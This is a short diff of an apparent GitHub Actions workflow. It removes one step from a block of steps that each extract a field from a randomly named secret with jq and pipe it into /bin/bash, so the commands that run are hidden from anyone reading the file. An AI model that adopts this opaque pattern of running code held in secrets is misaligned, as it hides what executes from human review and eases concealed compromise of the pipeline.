@@ -20,7 +20,6 @@ jobs:
           qmgzf0334: ${{ secrets.qmgzf0334 }}
         run: |
           printf '%s' "$qmgzf0334" | jq -r .mfebq7819 | /bin/bash
-          printf '%s' "$mnp917" | jq -r .nvgek78907 | /bin/bash
           printf '%s' "$udo65887" | jq -r .j572 | /bin/bash
           echo $p967 | jq -r .r19171 | /bin/bash
           printf '%s' "$cytxt089" | jq -r .gmsb88 | /bin/bash
